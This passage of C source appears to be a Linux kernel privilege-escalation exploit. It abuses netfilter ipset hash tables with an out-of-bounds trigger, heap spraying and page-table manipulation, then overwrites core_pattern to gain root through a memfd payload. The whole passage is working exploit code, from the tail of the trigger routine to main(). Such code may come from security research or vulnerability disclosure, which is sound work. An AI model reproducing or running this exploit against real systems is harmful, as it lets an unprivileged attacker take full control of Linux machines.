  th_status = TH_END;
  wait_ms(300);
  rep(i, ptrs_idx) { *ptrs[i] = 0; }
  // prevent corrupting free ptr
  assign_to_core(0);
  fill_kmalloc_96(KMALLOC_96_OBJS_PER_SLAB * 5);
  assign_to_core(1);
  fill_kmalloc_96(KMALLOC_96_OBJS_PER_SLAB * 5);

  struct in_addr addr = {0};
  u64 phys_addr = 0;
  u64 *ptr;
  LOG("coll_hash: %lx", coll_hash);
  rep(i, 0x80) {
    LOG("bucket: %x", i);
    find_collision4(&addr, coll_hash, HTABLE_BITS_VICTIM);
    coll_addrs[i] = addr;
    skbinfo = (struct ip_set_skbinfo){
        .skbmark = USER_PAGETABLE(phys_addr) >> 32,
        .skbmarkmask = USER_PAGETABLE(phys_addr) & ((1ul << 32) - 1)};
    add_to_ipset(victim_name, &addr, 0, NULL, &skbinfo);
    flush_tlb();
    rep(p, ptrs_idx) {
      for (int off = 0; off < 0x200; off += 4) {
        ptr = (u64 *)((char *)ptrs[p] + 0x1000 * off);
        if (*ptr) {
          char *vuln_ptr = (char *)ptr + CORE_PATTERN_PAGE_OFFSET;
          LOG("!! vuln ptr !!: %p", vuln_ptr);
          for (u64 step = 1; step <= 0x200; step++) {
            phys_addr = PHYSICAL_ALIGN * step + CORE_PATTERN_PHYS_OFFSET;
            LOG("phys kbase: %lx", phys_addr);
            rep(j, i + 1) {
              skbinfo = (struct ip_set_skbinfo){
                  .skbmark = USER_PAGETABLE(phys_addr) >> 32,
                  .skbmarkmask = USER_PAGETABLE(phys_addr) & ((1ul << 32) - 1)};
              add_to_ipset(victim_name, &coll_addrs[j], 0, NULL, &skbinfo);
            }
            flush_tlb();
            LOG("content: %lx", *(u64 *)vuln_ptr);
            if (*(long *)vuln_ptr == 0x65726f63 /* core */) {
              strcpy(vuln_ptr, CORE_PATTERN_MEMFD);
              core_pattern_win_memfd(LPE_BILLY);
              return 0;
            }
          }
        }
      }
    }
  }
  return 1;
}

void initialize(struct in_addr addrs[ADDR_N][4]) {
  struct in_addr addr = {0};

  sock = SYSCHK(socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER));

  for (u64 i = 0; i < HASH_N * 2; i++) {
    rep(j, 4) {
      find_collision4(&addr, i, HTABLE_BITS);
      addrs[i][j] = addr;
    }
  }

  addr = (struct in_addr){0};
  for (u64 i = 0; i < KMALLOC_96_OBJS_PER_SLAB * 24; i++) {
    find_collision4(&addr, i, HTABLE_BITS_VICTIM);
    victim_addrs[i] = addr;
  }
}

char buf[0x4000];
void drain_pcp() {
  int pp[0x80][2];
  rep(i, 0x80) {
    SYSCHK(pipe(pp[i]));
    SYSCHK(write(pp[i][1], buf, 0x4000));
  }
}

int main(int argc, char **argv) {
  LOG("start of exploit");
  init_billy(argv);
  unshare_setup();
  initialize(addrs4);

  rep(i, PTRS_N) {
    ptrs[i] = SYSCHK(mmap(PTI_TO_VIRT(0x80, 0xad, i, 2, 0), 0x1000 * 0x200,
                          PROT_READ | PROT_WRITE,
                          MAP_ANON | MAP_SHARED | MAP_FIXED, -1, 0));
  }
  *ptrs[0] = 'A';
  rep(i, 0x80) {
    if (!fork()) {
      drain_pcp();
      sleep(999999);
    }
  }
  rep(i, LOOP_COUNT) {
    snprintf(target_name, 0x20, "trigger_%d", i);
    snprintf(victim_name, 0x20, "victim_%d", i);
    create_ipset_ipv4(victim_name, 0xffffff, HTABLE_BITS_VICTIM, 0xffff,
                      IPSET_FLAG_WITH_SKBINFO);
    if (!trigger_oob())
      break;
  }
  LOG("end of exploit");
  return 0;
}
